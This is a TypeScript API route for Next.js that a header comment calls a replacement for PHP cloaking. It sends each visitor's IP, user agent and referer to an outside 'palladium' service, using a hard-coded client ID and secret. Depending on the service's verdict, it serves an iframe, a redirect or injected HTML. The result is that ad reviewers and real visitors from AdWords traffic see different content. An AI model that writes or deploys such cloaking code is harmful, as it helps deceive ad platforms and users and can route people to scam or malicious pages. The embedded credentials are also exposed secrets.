// /app/api/ads/route.ts (повноцінна заміна PHP клоакінгу на Next.js 13+ з обробкою помилок JSON і без NextResponse.next)
import { NextRequest } from 'next/server';

interface PalladiumResponse {
    result: boolean;
    mode?: number;
    target?: string;
    content?: string;
}

export async function GET(req: NextRequest) {
    const searchParams = req.nextUrl.searchParams;
    if (searchParams.get('dr_jsess') === '1') {
        return new Response(null, { status: 200 });
    }

    const ip = req.headers.get('x-forwarded-for') || '127.0.0.1';
    const ua = req.headers.get('user-agent') || '';
    const referer = req.headers.get('referer') || '';
    const host = req.headers.get('host') || '';

    const payload = {
        request: {},
        jsrequest: {},
        server: {
            REMOTE_ADDR: ip,
            SERVER_PROTOCOL: 'HTTP/1.1',
            SERVER_PORT: '443',
            REMOTE_PORT: '443',
            REQUEST_URI: req.nextUrl.pathname,
            REQUEST_SCHEME: 'https',
            'User-Agent': ua,
            Referer: referer,
            Host: host,
            bannerSource: 'adwords',
        },
        auth: {
            clientId: 3024,
            clientCompany: 'CQ21WW9U3ehzwXZOKITe',
            clientSecret: 'MzAyNENRMjFXVzlVM2VoendYWk9LSVRlY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
        },
    };

    try {
        const palladiumRes = await fetch('https://rbl.palladium.expert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(
                Object.entries(payload).reduce((acc, [key, val]) => {
                    acc[key] = JSON.stringify(val);
                    return acc;
                }, {} as Record<string, string>)
            ),
        });

        const text = await palladiumRes.text();
        let result: PalladiumResponse = { result: false };

        try {
            result = JSON.parse(text);
        } catch {
            console.error('❌ JSON parse error. Raw response:', text);
            return new Response(null, { status: 204 });
        }

        if (result.result) {
            const mode = result.mode;
            const target = result.target;
            const content = result.content;

            if (mode === 1 && target) {
                return new Response(
                    `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`,
                    {
                        status: 200,
                        headers: { 'Content-Type': 'text/html' },
                    }
                );
            } else if (mode === 2 && target) {
                return Response.redirect(target);
            } else if (mode === 4 && content) {
                return new Response(content, {
                    status: 200,
                    headers: { 'Content-Type': 'text/html' },
                });
            }
        }

        return new Response(null, { status: 204 });
    } catch (error) {
        console.error('Palladium API error', error);
        return new Response('Internal Server Error', { status: 500 });
    }
}
